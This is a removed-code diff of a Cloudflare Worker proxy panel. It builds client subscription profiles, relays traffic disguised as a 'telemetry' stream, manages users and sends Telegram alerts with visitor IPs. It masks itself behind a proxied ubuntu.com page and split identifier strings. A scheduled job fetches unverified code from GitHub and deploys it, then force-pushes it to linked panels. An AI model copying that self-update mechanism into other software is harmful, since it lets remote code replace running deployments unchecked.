-                    resHeaders.set("Access-Control-Allow-Origin", "*");
-
-                    let flag = (
-                        url.searchParams.get("flag") ||
-                        url.searchParams.get("format") ||
-                        url.searchParams.get("type") ||
-                        url.searchParams.get("output") ||
-                        ""
-                    ).toLowerCase();
-
-                    if (isValidUser && targetUser) {
-                        let idClean = targetUser.id
-                            .replace(/-/g, "")
-                            .toLowerCase();
-                        let sysU = sysUsageCache?.users?.[idClean] || {
-                            reqs: 0,
-                            dReqs: 0,
-                        };
-                        let totalReqs = sysU.reqs || 0;
-                        let limitTotal = 0;
-                        let expiryMs = 0;
-                        if (hasMultiUser) {
-                            limitTotal = targetUser.limitTotalReq || 0;
-                            expiryMs = targetUser.expiryMs || 0;
-                        } else {
-                            limitTotal = sysConfig.limitTotalReq || 0;
-                            expiryMs = sysConfig.expiryMs || 0;
-                        }
-
-                        let usedBytes = usageTotalBytes(sysU);
-                        let limitBytes = limitReqToBytes(limitTotal);
-                        let expireSec = expiryMs
-                            ? Math.floor(expiryMs / 1000)
-                            : 0;
-
-                        const subUserInfo = `upload=0; download=${usedBytes}; total=${limitBytes}; expire=${expireSec}`;
-                        resHeaders.set("Subscription-UserInfo", subUserInfo);
-                        resHeaders.set("subscription-userinfo", subUserInfo);
-                        resHeaders.set("Profile-Update-Interval", "12");
-                        resHeaders.set("profile-update-interval", "12");
-
-                        let cleanName = encodeURIComponent(targetUser.name);
-                        resHeaders.set(
-                            "Content-Disposition",
-                            `attachment; filename="${cleanName}"; filename*=UTF-8''${cleanName}`,
-                        );
-                    }
-
-                    // Determine subscription format
-                    let isClashYaml = false;
-                    let isSingboxJson = false;
-                    let isClashJson = false;
-                    let isVJson = false;
-
-                    // If flag is explicitly set, we respect it
-                    if (
-                        flag === "clash" ||
-                        flag === "yaml" ||
-                        flag === "meta" ||
-                        flag === "stash" ||
-                        flag === "clash-meta" ||
-                        flag === "y"
-                    ) {
-                        isClashYaml = true;
-                    } else if (flag === "b" || flag === "c_legacy") {
-                        isClashJson = true;
-                    } else if (
-                        flag === "sing" ||
-                        flag === "singbox" ||
-                        flag === "sing-box" ||
-                        flag === "sb" ||
-                        flag === "s" ||
-                        flag === "c" ||
-                        flag === "g"
-                    ) {
-                        isSingboxJson = true;
-                    } else if (flag === "vjson" || flag === "v") {
-                        isVJson = true;
-                    } else if (flag === "base64") {
-                        // Skip auto-detect to default to base64 plain-text subscription format
-                    } else if (flag === "a" || flag === "raw" || flag === "") {
-                        // Safe auto-detect for raw sync or no-flag links using target browser / client User-Agent
-                        if (
-                            ua.includes(getGamma()) ||
-                            ua.includes("meta") ||
-                            ua.includes("sta" + "sh") ||
-                            ua.includes("verge") ||
-                            ua.includes("mihomo") ||
-                            ua.includes("cfw") ||
-                            ua.includes("stash") ||
-                            ua.includes("clash")
-                        ) {
-                            isClashYaml = true;
-                        } else if (
-                            ua.includes("sing-box") ||
-                            ua.includes("singbox") ||
-                            ua.includes("hiddify") ||
-                            ua.includes("nekobox") ||
-                            ua.includes("sfa") ||
-                            ua.includes("karing")
-                        ) {
-                            isSingboxJson = true;
-                        }
-                    }
-
-                    if (isClashYaml) {
-                        resHeaders.set(
-                            "Content-Type",
-                            "text/yaml; charset=utf-8",
-                        );
-                        return new Response(
-                            await buildYamlProfile(clientHost, targetSub, allowInsecure, env),
-                            {
-                                headers: resHeaders,
-                            },
-                        );
-                    } else if (isSingboxJson) {
-                        resHeaders.set(
-                            "Content-Type",
-                            "application/json; charset=utf-8",
-                        );
-                        return new Response(
-                            JSON.stringify(
-                                await buildSingBoxJsonProfile(clientHost, targetSub, allowInsecure, env),
-                                null,
-                                2,
-                            ),
-                            {
-                                headers: resHeaders,
-                            },
-                        );
-                    } else if (isClashJson) {
-                        resHeaders.set(
-                            "Content-Type",
-                            "application/json; charset=utf-8",
-                        );
-                        return new Response(
-                            JSON.stringify(
-                                await buildClashJsonProfile(clientHost, targetSub, allowInsecure, env),
-                                null,
-                                2,
-                            ),
-                            {
-                                headers: resHeaders,
-                            },
-                        );
-                    } else if (isVJson) {
-                        resHeaders.set("Content-Type", "application/json; charset=utf-8");
-                        return new Response(JSON.stringify(await buildVJsonProfile(clientHost, targetSub, allowInsecure, env), null, 2), { headers: resHeaders });
-                    } else {
-                        resHeaders.set(
-                            "Content-Type",
-                            "text/plain; charset=utf-8",
-                        );
-                        const raw = await buildUriProfile(
-                            clientHost,
-                            targetSub,
-                            allowInsecure,
-                        );
-                        return new Response(safeBtoa(raw), {
-                            headers: resHeaders,
-                        });
-                    }
-                }
-            }
-
-            if (isTelemetryStream) {
-                if (sysConfig.isPaused)
-                    return new Response(null, { status: 503 });
-                // Reconnect-storm backoff before the handshake stacks up.
-                try {
-                    const wip =
-                        request.headers.get("cf-connecting-ip") || "unknown";
-                    const wr = wsRateCheck(wip);
-                    if (wr === "refuse")
-                        return new Response("Too many requests", {
-                            status: 429,
-                            headers: { "Retry-After": "60" },
-                        });
-                    if (wr === "tarpit") await sleepMs(1500);
-                } catch (e) {}
-                // Breaker L2: slow down reconnect storms instead of
-                // stacking more handshakes onto a saturated isolate.
-                try {
-                    if (breakerLevel() >= 2) await sleepMs(1000);
-                } catch (e) {}
-                let wsRelayIdx = -1;
-                try {
-                    const riParam = url.searchParams.get("ri");
-                    if (riParam !== null) wsRelayIdx = parseInt(riParam, 10);
-                } catch (e) {}
-                if (wsRelayIdx < 0) {
-                    try {
-                        const lastSeg = url.pathname.split("/").pop();
-                        if (lastSeg) {
-                            const num = parseInt(lastSeg, 10);
-                            if (!isNaN(num) && num >= 0) wsRelayIdx = num;
-                        }
-                    } catch (e) {}
-                }
-                if (wsRelayIdx < 0) {
-                    try {
-                        const lastSeg = url.pathname.split("/").pop();
-                        if (lastSeg) {
-                            const decoded = JSON.parse(atob(lastSeg));
-                            if (typeof decoded.relayIdx === "number")
-                                wsRelayIdx = decoded.relayIdx;
-                        }
-                    } catch (e) {}
-                }
-                return await processTelemetryStream(env, ctx, wsRelayIdx);
-            }
-
-            return new Response(null, { status: 404 });
-        } catch (err) {
-            return new Response(null, { status: 404 });
-        } finally {
-            try {
-                INFLIGHT_HTTP = Math.max(0, INFLIGHT_HTTP - 1);
-            } catch (e) {}
-        }
-    },
-    async scheduled(event, env, ctx) {
-        try {
-            await loadSysConfig(env, ctx);
-            if (sysConfig.autoUpdate && sysConfig.cfAccountId && sysConfig.cfApiToken && sysConfig.cfWorkerName) {
-                const repo = (sysConfig.githubRepo || "itsyebekhe/nahan")
-                    .replace(/https?:\/\/github\.com\//, "")
-                    .trim();
-                let remoteVer = null;
-                try {
-                    const res = await fetchT(`https://raw.githubusercontent.com/${repo}/main/version`);
-                    if (res.ok) {
-                        remoteVer = (await res.text()).trim();
-                    }
-                } catch (e) {}
-                
-                if (remoteVer && cmpVersions(CURRENT_VERSION, remoteVer) < 0) {
-                    try {
-                        let res = await fetchT(`https://raw.githubusercontent.com/${repo}/main/_worker.encode.js`);
-                        if (!res.ok) {
-                            res = await fetchT(`https://raw.githubusercontent.com/${repo}/main/_worker.encoded.js`);
-                            if (!res.ok) {
-                                res = await fetchT(`https://raw.githubusercontent.com/${repo}/main/_worker.js`);
-                            }
-                        }
-                        if (!res.ok) throw new Error(`HTTP ${res.status}`);
-                        let latestCode = await res.text();
-                        const deployRes = await deployWorkerToCloudflare(
-                            sysConfig.cfAccountId,
-                            sysConfig.cfApiToken,
-                            sysConfig.cfWorkerName,
-                            latestCode
-                        );
-                        const deployResult = await deployRes.json();
-                        if (deployResult.success) {
-                            await logActivity(env, "Auto-Update Success", `Auto-updated to v${remoteVer} (encoded)`);
-                            if (sysConfig.linkedPanels && Array.isArray(sysConfig.linkedPanels)) {
-                                for (const p of sysConfig.linkedPanels) {
-                                    if (p && p.url && p.apiKey) {
-                                        let cleanUrl = p.url.trim();
-                                        if (!cleanUrl.startsWith("http://") && !cleanUrl.startsWith("https://")) {
-                                            cleanUrl = "https://" + cleanUrl;
-                                        }
-                                        try {
-                                            const parsed = new URL(cleanUrl);
-                                            const targetUrl = `${parsed.protocol}//${parsed.host}/${encodeURI(sysConfig.apiRoute)}/api/update`;
-                                            ctx?.waitUntil(
-                                                fetchT(targetUrl, {
-                                                    method: "POST",
-                                                    headers: { "Content-Type": "application/json" },
-                                                    body: JSON.stringify({
-                                                        key: p.apiKey,
-                                                        action: "deploy",
-                                                        code: latestCode,
-                                                        force: true
-                                                    }),
-                                                    signal: AbortSignal.timeout(15000)
-                                                }).catch(() => {})
-                                            );
-                                        } catch (err) {}
-                                    }
-                                }
-                            }
-                        }
-                    } catch (e) {
-                        await logActivity(env, "Auto-Update Failed", `Auto-update failed: ${e.message}`);
-                    }
-                }
-            }
-        } catch (e) {}
-    }
-};
-
-async function serveMaintenancePage(request, url) {
-    // Breaker L1: skip the origin fetch under load ( shards of ubuntu/docker
-    // fetches during floods kept isolates busy with zero user value).
-    try {
-        if (breakerLevel() >= 1) {
-            return new Response("Not Found", { status: 404 });
-        }
-    } catch (e) {}
-    let fakeList = sysConfig.maintenanceHost
-        ? sysConfig.maintenanceHost
-              .split(",")
-              .map((s) => s.trim())
-              .filter((s) => s)
-        : ["https://www.ubuntu.com"];
-    const clientIP = request.headers.get("cf-connecting-ip") || "0.0.0.0";
-    const ipHash = Array.from(clientIP).reduce(
-        (acc, char) => acc + char.charCodeAt(0),
-        0,
-    );
-    const targetStr = fakeList[ipHash % fakeList.length].startsWith("http")
-        ? fakeList[ipHash % fakeList.length]
-        : `https://${fakeList[ipHash % fakeList.length]}`;
-
-    try {
-        const targetUrl = new URL(targetStr);
-        if (url.pathname !== "/") targetUrl.pathname = url.pathname;
-        targetUrl.search = url.search;
-        const cleanHeaders = new Headers(request.headers);
-        cleanHeaders.set("Host", targetUrl.hostname);
-        cleanHeaders.delete("cf-connecting-ip");
-        cleanHeaders.delete("x-forwarded-for");
-        const fetchInit = {
-            method: request.method,
-            headers: cleanHeaders,
-            redirect: "follow",
-        };
-        if (request.method !== "GET" && request.method !== "HEAD")
-            fetchInit.body = request.body;
-        return await fetchT(new Request(targetUrl.toString(), fetchInit));
-    } catch (e) {
-        return new Response("Not Found", { status: 404 });
-    }
-}
-
-
-let sysConfigLoading = null;
-let sysUsageLoading = null;
-let backupIpLoading = null;
-
-function migrateSlaveNodesToLinkedPanels(config) {
-    let modified = false;
-    if (config && config.slaveNodes && config.slaveNodes.trim().length > 0) {
-        if (!config.linkedPanels) config.linkedPanels = [];
-        let nodes = config.slaveNodes
-            .split(/[\r\n,;]+/)
-            .map((s) => s.trim())
-            .filter(Boolean);
-        let syncKey = config.syncApiKey || "";
-        nodes.forEach((node) => {
-            let cleanNode = node.replace(/^[a-zA-Z]+:\/\//, "").split("/")[0].split("@").pop().split(":")[0].toLowerCase();
-            let exists = config.linkedPanels.some((p) => {
-                if (!p || !p.url) return false;
-                let cleanUrl = p.url.replace(/^[a-zA-Z]+:\/\//, "").split("/")[0].split("@").pop().split(":")[0].toLowerCase();
-                return cleanUrl === cleanNode;
-            });
-            if (!exists) {
-                config.linkedPanels.push({ url: node, apiKey: syncKey });
-                modified = true;
-            }
-        });
-        config.slaveNodes = "";
-        modified = true;
-    }
-    return modified;
-}
-
-async function loadSysConfig(env, ctx = null) {
-    const now = Date.now();
-
-    if (env.IOT_DB) {
-        if (now - sysConfigCacheTime > CACHE_TTL_CONFIG) {
-            if (!sysConfigLoading) {
-                sysConfigLoading = d1Get(env, "sys_config")
-                    .then((stored) => {
-                        sysConfig = {
-                            ...SYSTEM_DEFAULTS,
-                            ...(stored ? JSON.parse(stored) : null),
-                        };
-                        sysConfigCacheTime = Date.now();
-                        if (migrateSlaveNodesToLinkedPanels(sysConfig)) {
-                            const promise = cachedD1Put(env, "sys_config", JSON.stringify(sysConfig));
-                            if (ctx && typeof ctx.waitUntil === "function") {
-                                ctx.waitUntil(promise.catch(() => {}));
-                            } else {
-                                promise.catch(() => {});
-                            }
-                        }
-                    })
-                    .catch(() => {
-                        sysConfig = { ...SYSTEM_DEFAULTS };
-                        sysConfigCacheTime = Date.now();
-                    })
-                    .finally(() => {
-                        sysConfigLoading = null;
-                    });
-            }
-            await sysConfigLoading;
-        }
-        if (now - sysUsageCacheTime > CACHE_TTL_USAGE) {
-            if (!sysUsageLoading) {
-                sysUsageLoading = d1Get(env, "sys_usage")
-                    .then((ustored) => {
-                        if (ustored) sysUsageCache = JSON.parse(ustored);
-                        else sysUsageCache = { users: {} };
-                        sysUsageCacheTime = Date.now();
-                    })
-                    .catch(() => {
-                        sysUsageCache = { users: {} };
-                        sysUsageCacheTime = Date.now();
-                    })
-                    .finally(() => {
-                        sysUsageLoading = null;
-                    });
-            }
-            await sysUsageLoading;
-        }
-    }
-
-    if (now - backupIpCacheTime > CACHE_TTL_BACKUP_IP) {
-        if (!backupIpLoading) {
-            backupIpLoading = (
-                env.IOT_DB ? d1Get(env, "backup_ip") : Promise.resolve(null)
-            )
-                .then((val) => {
-                    backupIpCache = val;
-                    backupIpCacheTime = Date.now();
-                })
-                .catch(() => {
-                    backupIpCacheTime = Date.now();
-                })
-                .finally(() => {
-                    backupIpLoading = null;
-                });
-        }
-        await backupIpLoading;
-    }
-    sysConfig.customRelay = backupIpCache ?? env.RELAY_IP ?? "";
-}
-
-async function fetchCloudflareUsage(accountId, apiToken) {
-    if (!accountId || !apiToken) return null;
-    try {
-        const d = new Date();
-        const currentDate = d.toISOString().split("T")[0] + "T00:00:00Z";
-
-        const query = `query GetDailyUsage($accountId: String!, $start: ISO8601DateTime!) { viewer { accounts(filter: {accountTag: $accountId}) { workersInvocationsAdaptive(limit: 1, filter: { datetime_geq: $start }) { sum { requests } } } } }`;
-        const variables = { accountId: accountId, start: currentDate };
-
-        const res = await fetchT(
-            "https://api.cloudflare.com/client/v4/graphql",
-            {
-                method: "POST",
-                headers: {
-                    Authorization: `Bearer ${apiToken}`,
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify({ query, variables }),
-            },
-        );
-
-        const json = await res.json();
-        const reqs =
-            json?.data?.viewer?.accounts?.[0]?.workersInvocationsAdaptive?.[0]
-                ?.sum?.requests;
-        return typeof reqs === "number" ? reqs : null;
-    } catch (e) {
-        return null;
-    }
-}
-
-async function sendTelegramMessage(request, type, hostName) {
-    if (!sysConfig.tgToken || !(sysConfig.tgAdminId || sysConfig.tgChatId))
-        return;
-
-    const escMd = (s) => String(s).replace(/[_*()[`[]/g, "\\$&");
-
-    let usageStr = "نامشخص (0.00%)";
-    if (sysConfig.cfAccountId && sysConfig.cfApiToken) {
-        const reqs = await fetchCloudflareUsage(
-            sysConfig.cfAccountId,
-            sysConfig.cfApiToken,
-        );
-        if (reqs !== null) {
-            const limit = 100000;
-            const pct = ((reqs / limit) * 100).toFixed(2);
-            usageStr = `${reqs}/${limit} ${pct}%`;
-        }
-    }
-
-    const ip = request.headers.get("cf-connecting-ip") || "Unknown";
-    const cf = request.cf || {};
-    const country = cf.country || "Unknown";
-    const city = cf.city || "Unknown";
-    const asn = cf.asn || "Unknown";
-    const asOrg = cf.asOrganization || "Unknown";
-    const domain = request.headers.get("Host") || new URL(request.url).hostname;
-    const path = new URL(request.url).pathname;
-    const ua =
-        request.headers.get("User-Agent") || "حالا یوزرایجنت مارو نبینین";
-
-    const d = new Date();
-    const timeStr = new Intl.DateTimeFormat("fa-IR", {
-        year: "numeric",
-        month: "long",
-        day: "numeric",
-        hour: "2-digit",
-        minute: "2-digit",
-        second: "2-digit",
-    }).format(d);
-
-    const text =
-        `📌 نوع: ${escMd(type)}\n` +
-        `🌐 IP: ${escMd(ip)}\n` +
-        `📍 موقعیت: ${escMd(country)} ${escMd(city)}\n` +
-        `🏢 ASN: AS${escMd(asn)} ${escMd(asOrg)}\n` +
-        `🔗 دامنه: ${escMd(domain)}\n` +
-        `🔍 مسیر: ${escMd(path)}\n` +
-        `🤖 مرورگر: ${escMd(ua)}\n` +
-        `📅 زمان: ${escMd(timeStr)}\n` +
-        `📊 مصرف: ${usageStr}`;
-
-    const h = hostName || domain;
-    const langCode = sysConfig.tgBotLang || "fa";
-    const locT = (key) =>
-        botI18n[langCode]?.[key] || botI18n["en"]?.[key] || key;
-    const isPaused = sysConfig.isPaused || false;
-    const panelUrl = `https://${h}/${encodeURI(sysConfig.apiRoute)}/dash`;
-    const subUrl = `https://${h}/${sysConfig.apiRoute}`;
-    const inline_keyboard = [
-        [
-            { text: `📊 ${locT("dashboard")}`, callback_data: "sys_dashboard" },
-            { text: `📈 ${locT("statistics")}`, callback_data: "sys_stats" },
-        ],
-        [
-            {
-                text: `🔗 ${locT("btn_sub_link")}`,
-                callback_data: "get_sub_link",
-            },
-            {
-                text: `ℹ️ ${locT("panel_info")}`,
-                callback_data: "sys_panel_info",
-            },
-        ],
-        [
-            {
-                text: `🌐 ${langCode === "fa" ? "English 🇺🇸" : "فارسی 🇮🇷"}`,
-                callback_data: "sys_lang",
-            },
-            {
-                text: isPaused
-                    ? `▶️ ${locT("btn_resume")}`
-                    : `⏸️ ${locT("btn_pause")}`,
-                callback_data: "sys_toggle_status",
-            },
-        ],
-        [{ text: `🔑 ${locT("dash")}`, web_app: { url: panelUrl } }],
-    ];
-
-    const tgUrl = `https://api.telegram.org/bot${sysConfig.tgToken}/sendMessage`;
-    const notifyChatId = sysConfig.tgAdminId || sysConfig.tgChatId;
-    try {
-        await fetchT(tgUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: notifyChatId,
-                text: text,
-                parse_mode: "Markdown",
-                reply_markup: /** @type {any} */ ({ inline_keyboard }),
-            }),
-        });
-    } catch (e) {}
-}
-
-async function logActivity(env, type, detail) {
-    if (!env || !env.IOT_DB) return;
-    try {
-        const ts = new Date().toISOString();
-        let logs = [];
-        const stored = await d1Get(env, "sys_logs");
-        if (stored) logs = JSON.parse(stored);
-        logs.unshift({ ts, type, detail });
-        if (logs.length > 50) logs = logs.slice(0, 50);
-        await d1Put(env, "sys_logs", JSON.stringify(logs));
-    } catch (e) {}
-}
-
-async function handleLogs(request, env) {
-    try {
-        if (request.method === "POST") {
-            const data = await request.json();
-            if (!isAuthorized(request, data))
-                return new Response(JSON.stringify({ success: false }), {
-                    status: 401,
-                });
-            let logs = [];
-            if (env.IOT_DB) {
-                const stored = await d1Get(env, "sys_logs");
-                if (stored) logs = JSON.parse(stored);
-            }
-            return new Response(JSON.stringify({ success: true, logs }), {
-                status: 200,
-            });
-        }
-        return new Response("OK", { status: 200 });
-    } catch (e) {
-        return new Response(JSON.stringify({ success: false }), {
-            status: 400,
-        });
-    }
-}
-
-async function handleUsersApi(request, env, ctx) {
-    try {
-        const url = new URL(request.url);
-        const method = request.method;
-        const userId = url.searchParams.get("id");
-        const action = url.searchParams.get("action");
-
-        const authHeader = request.headers.get("Authorization") || "";
-        const authKey =
-            authHeader.replace("Bearer ", "") ||
-            url.searchParams.get("key") ||
-            "";
-        let bodyKey = "";
-        if (method === "POST" || method === "PUT") {
-            try {
-                const body = await request.clone().json();
-                bodyKey = body.key || "";
-            } catch (e) {}
-        }
-        const isAuth =
-            authKey === sysConfig.masterKey ||
-            bodyKey === sysConfig.masterKey ||
-            isPanelApiKey(authKey) ||
-            isPanelApiKey(bodyKey);
-        const gateIp =
-            request.headers.get("cf-connecting-ip") || "Unknown";
-        if (authBlocked(gateIp)) {
-            return new Response(
-                JSON.stringify({ success: false, error: "Too many attempts" }),
-                {
-                    status: 429,
-                    headers: { "Content-Type": "application/json" },
-                },
-            );
-        }
-        if (!isAuth) {
-            authFail(gateIp);
-            return new Response(
-                JSON.stringify({ success: false, error: "Unauthorized" }),
-                {
-                    status: 401,
-                    headers: { "Content-Type": "application/json" },
-                },
-            );
-        }
-
-        if (method === "GET" && !userId) {
-            const q = url.searchParams.get("q") || "";
-            let users = sysConfig.users || [];
-            if (q) {
-                const ql = q.toLowerCase();
-                users = users.filter(
-                    (u) =>
-                        u.name.toLowerCase().includes(ql) ||
-                        u.id.toLowerCase().includes(ql) ||
-                        (u.notes && u.notes.toLowerCase().includes(ql)),
-                );
-            }
-            const enriched = users.map((u) => {
-                const idClean = u.id.replace(/-/g, "").toLowerCase();
-                const sysU = sysUsageCache?.users?.[idClean] || {
-                    reqs: 0,
-                    dReqs: 0,
-                    lastDay: "",
-                };
-                const usedBytes = usageTotalBytes(sysU);
-                const limitBytes = limitReqToBytes(u.limitTotalReq);
-                const isExpired = u.expiryMs && Date.now() > u.expiryMs;
-                let status = "active";
-                if (u.isPaused && u.disabledReason) status = "auto-disabled";
-                else if (u.isPaused) status = "paused";
-                else if (isExpired) status = "expired";
-                return {
-                    ...u,
-                    usage: {
-                        total: usedBytes,
-                        limit: limitBytes,
-                        daily: sysU.dReqs || 0,
-                        dailyLimit: u.limitDailyReq || 0,
-                    },
-                    status,
-                };
-            });
-            return new Response(
-                JSON.stringify({
-                    success: true,
-                    users: enriched,
-                    total: enriched.length,
-                }),
-                { headers: { "Content-Type": "application/json" } },
-            );
-        }
-
-        if (method === "GET" && userId) {
-            const u = (sysConfig.users || []).find(
-                (usr) =>
-                    usr.id === userId ||
-                    usr.name.toLowerCase() === userId.toLowerCase(),
-            );
-            if (!u)
-                return new Response(
-                    JSON.stringify({ success: false, error: "User not found" }),
-                    {
-                        status: 404,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            const idClean = u.id.replace(/-/g, "").toLowerCase();
-            const sysU = sysUsageCache?.users?.[idClean] || {
-                reqs: 0,
-                dReqs: 0,
-                lastDay: "",
-            };
-            const usedBytes = usageTotalBytes(sysU);
-            const limitBytes = limitReqToBytes(u.limitTotalReq);
-            const isExpired = u.expiryMs && Date.now() > u.expiryMs;
-            let status = "active";
-            if (u.isPaused && u.disabledReason) status = "auto-disabled";
-            else if (u.isPaused) status = "paused";
-            else if (isExpired) status = "expired";
-            const hostName = new URL(request.url).hostname;
-            const subUrl = `https://${hostName}/${sysConfig.apiRoute}?sub=${encodeURIComponent(u.name)}`;
-            return new Response(
-                JSON.stringify({
-                    success: true,
-                    user: {
-                        ...u,
-                        usage: {
-                            total: usedBytes,
-                            limit: limitBytes,
-                            daily: sysU.dReqs || 0,
-                            dailyLimit: u.limitDailyReq || 0,
-                        },
-                        status,
-                        subscriptionUrl: subUrl,
-                    },
-                }),
-                { headers: { "Content-Type": "application/json" } },
-            );
-        }
-
-        if (method === "POST" && !userId) {
-            const body = await request.json();
-            const {
-                name,
-                trafficLimit,
-                expiryDays,
-                notes,
-                maxConfigs,
-                proxyIp,
-                cleanIp,
-                userMode,
-                userPorts,
-                userNodes,
-                nat64,
-                connLimit,
-                userPanelUrl,
-                segMode,
-                segPackets,
-                segLengths,
-                segDelays,
-                segMaxSplit,
-                segManual,
-                tlsMask,
-            } = body;
-            if (!name)
-                return new Response(
-                    JSON.stringify({
-                        success: false,
-                        error: "Name is required",
-                    }),
-                    {
-                        status: 400,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            const newId = crypto.randomUUID();
-            const newUser = {
-                id: newId,
-                name: name,
-                limitTotalReq: trafficLimit
-                    ? Math.floor(parseFloat(trafficLimit) * 6000)
-                    : null,
-                limitDailyReq: body.dailyLimit
-                    ? Math.floor(parseFloat(body.dailyLimit) * 6000)
-                    : null,
-                expiryMs: expiryDays
-                    ? Date.now() + parseInt(expiryDays) * 86400000
-                    : null,
-                notes: notes || "",
-                maxConfigs: maxConfigs ? parseInt(maxConfigs) : null,
-                proxyIp: proxyIp || null,
-                cleanIp: cleanIp || null,
-                userMode: userMode || null,
-                userPorts: userPorts || null,
-                userNodes: userNodes || null,
-                nat64: nat64 || null,
-                connLimit: connLimit ? parseInt(connLimit) : null,
-                userPanelUrl: userPanelUrl || null,
-                segMode:
-                    segMode === "builder" || segMode === "manual"
-                        ? segMode
-                        : null,
-                segPackets: segPackets ? String(segPackets).slice(0, 32) : null,
-                segLengths: segLengths ? String(segLengths).slice(0, 200) : null,
-                segDelays: segDelays ? String(segDelays).slice(0, 200) : null,
-                segMaxSplit: segMaxSplit ? String(segMaxSplit).slice(0, 12) : null,
-                segManual: segManual ? String(segManual).slice(0, 4000) : null,
-                tlsMask: tlsMask ? String(tlsMask).slice(0, 2000) : null,
-                createdAt: Date.now(),
-            };
-            await resolveUserProxyIpGeo(newUser);
-            if (!sysConfig.users) sysConfig.users = [];
-            sysConfig.users.push(newUser);
-            await cachedD1Put(env, "sys_config", JSON.stringify(sysConfig));
-            ctx?.waitUntil(
-                logActivity(
-                    env,
-                    "User Created",
-                    `User "${name}" (${newId}) created via API`,
-                ).catch(() => {}),
-            );
-            const hostName = new URL(request.url).hostname;
-            const subUrl = `https://${hostName}/${sysConfig.apiRoute}?sub=${encodeURIComponent(name)}`;
-            return new Response(
-                JSON.stringify({
-                    success: true,
-                    user: newUser,
-                    subscriptionUrl: subUrl,
-                }),
-                {
-                    status: 201,
-                    headers: { "Content-Type": "application/json" },
-                },
-            );
-        }
-
-        if (method === "PUT" && userId) {
-            const body = await request.json();
-            if (!sysConfig.users)
-                return new Response(
-                    JSON.stringify({ success: false, error: "No users" }),
-                    {
-                        status: 400,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            const u = sysConfig.users.find((usr) => usr.id === userId);
-            if (!u)
-                return new Response(
-                    JSON.stringify({ success: false, error: "User not found" }),
-                    {
-                        status: 404,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            // Graveyard placements are keyed "user:<name>": migrate them on
-            // rename or buried relays of this user would never resurrect.
-            const oldUName = u.name;
-            if (body.name !== undefined) u.name = body.name;
-            if (body.trafficLimit !== undefined)
-                u.limitTotalReq = body.trafficLimit
-                    ? Math.floor(parseFloat(body.trafficLimit) * 6000)
-                    : null;
-            if (body.dailyLimit !== undefined)
-                u.limitDailyReq = body.dailyLimit
-                    ? Math.floor(parseFloat(body.dailyLimit) * 6000)
-                    : null;
-            if (body.expiryDays !== undefined)
-                u.expiryMs = body.expiryDays
-                    ? Date.now() + parseInt(body.expiryDays) * 86400000
-                    : null;
-            if (body.notes !== undefined) u.notes = body.notes;
-            if (body.maxConfigs !== undefined)
-                u.maxConfigs = body.maxConfigs
-                    ? parseInt(body.maxConfigs)
-                    : null;
-            if (body.proxyIp !== undefined) {
-                u.proxyIp = body.proxyIp;
-                if (!body.proxyIp) {
-                    u.proxyIpGeo = null;
-                } else {
-                    await resolveUserProxyIpGeo(u);
-                }
-            }
-            if (body.cleanIp !== undefined) u.cleanIp = body.cleanIp;
-            if (body.userMode !== undefined) u.userMode = body.userMode;
-            if (body.userPorts !== undefined) u.userPorts = body.userPorts;
-            if (body.userNodes !== undefined) u.userNodes = body.userNodes;
-            if (body.nat64 !== undefined) u.nat64 = body.nat64;
-            if (body.connLimit !== undefined)
-                u.connLimit = body.connLimit ? parseInt(body.connLimit) : null;
-            if (body.userPanelUrl !== undefined)
-                u.userPanelUrl = body.userPanelUrl || null;
-            if (body.segMode !== undefined)
-                u.segMode =
-                    body.segMode === "builder" || body.segMode === "manual"
-                        ? body.segMode
-                        : null;
-            if (body.segPackets !== undefined)
-                u.segPackets = body.segPackets
-                    ? String(body.segPackets).slice(0, 32)
-                    : null;
-            if (body.segLengths !== undefined)
-                u.segLengths = body.segLengths
-                    ? String(body.segLengths).slice(0, 200)
-                    : null;
-            if (body.segDelays !== undefined)
-                u.segDelays = body.segDelays
-                    ? String(body.segDelays).slice(0, 200)
-                    : null;
-            if (body.segMaxSplit !== undefined)
-                u.segMaxSplit = body.segMaxSplit
-                    ? String(body.segMaxSplit).slice(0, 12)
-                    : null;
-            if (body.segManual !== undefined)
-                u.segManual = body.segManual
-                    ? String(body.segManual).slice(0, 4000)
-                    : null;
-            if (body.tlsMask !== undefined)
-                u.tlsMask = body.tlsMask
-                    ? String(body.tlsMask).slice(0, 2000)
-                    : null;
-            if (body.status !== undefined) {
-                if (body.status === "active") {
-                    u.isPaused = false;
-                    u.disabledReason = null;
-                    u.disabledAt = null;
-                } else if (body.status === "paused") {
-                    u.isPaused = true;
-                    u.disabledReason = null;
-                    u.disabledAt = null;
-                }
-            }
-            try {
-                if (
-                    oldUName &&
-                    u.name &&
-                    oldUName !== u.name
-                ) {
-                    const gg = JSON.parse(
-                        (await d1Get(env, "relay_graveyard")) || "{}",
-                    );
-                    let gChanged = false;
-                    for (const gk of Object.keys(gg || {})) {
-                        const ge = gg[gk];
-                        if (
-                            ge &&
-                            Array.isArray(ge.lists) &&
-                            ge.lists.indexOf("user:" + oldUName) !== -1
-                        ) {
-                            ge.lists = [
-                                ...new Set(
-                                    ge.lists.map((l) =>
-                                        l === "user:" + oldUName
-                                            ? "user:" + u.name
-                                            : l,
-                                    ),
-                                ),
-                            ];
-                            gChanged = true;
-                        }
-                    }
-                    if (gChanged)
-                        await d1Put(
-                            env,
-                            "relay_graveyard",
-                            JSON.stringify(gg),
-                        );
-                }
-            } catch (e) {}
-            await cachedD1Put(env, "sys_config", JSON.stringify(sysConfig));
-            ctx?.waitUntil(
-                logActivity(
-                    env,
-                    "User Updated",
-                    `User "${u.name}" (${userId}) updated via API`,
-                ).catch(() => {}),
-            );
-            return new Response(JSON.stringify({ success: true, user: u }), {
-                headers: { "Content-Type": "application/json" },
-            });
-        }
-
-        if (method === "DELETE" && userId) {
-            if (!sysConfig.users)
-                return new Response(
-                    JSON.stringify({ success: false, error: "No users" }),
-                    {
-                        status: 400,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            const idx = sysConfig.users.findIndex((usr) => usr.id === userId);
-            if (idx === -1)
-                return new Response(
-                    JSON.stringify({ success: false, error: "User not found" }),
-                    {
-                        status: 404,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            const deleted = sysConfig.users.splice(idx, 1)[0];
